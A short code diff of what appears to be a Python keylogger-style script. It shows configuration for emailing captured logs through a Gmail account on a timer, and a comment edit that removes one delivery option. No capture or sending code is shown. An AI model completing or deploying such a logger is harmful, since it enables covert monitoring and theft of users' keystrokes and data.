@@ -5,7 +5,7 @@ from datetime import datetime as dt
 REPORT_DELAY = 240 #60 (seconds) = 1 minute
 EMAIL_ADD = "@gmail.com"
 EMAIL_PASS = "" #we will need both address and password to log into a gmail account to send logs
-active_method = "email"  #available methods are: email, file, prompt
+active_method = "email"  #available methods are: email, file
 
 class Logger:
     def __init__(self, interval, method="email"):
